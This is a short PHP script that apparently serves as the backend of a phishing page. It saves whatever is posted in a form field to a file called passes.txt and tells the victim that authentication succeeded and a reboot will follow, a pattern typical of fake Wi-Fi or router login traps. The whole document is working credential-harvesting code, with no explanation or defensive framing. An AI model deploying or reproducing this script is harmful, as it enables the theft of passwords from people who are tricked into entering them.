<?php
if(isset($_POST['field1'])) {
    $data = $_POST['field1'] . "\r\n";
    $ret = file_put_contents('passes.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('An error has occured');
    }
    else {
        echo "Thank you for Authenticating. A Reboot will occur Shortly!";
    }
}
else {
   die('no post data to process');
}
?>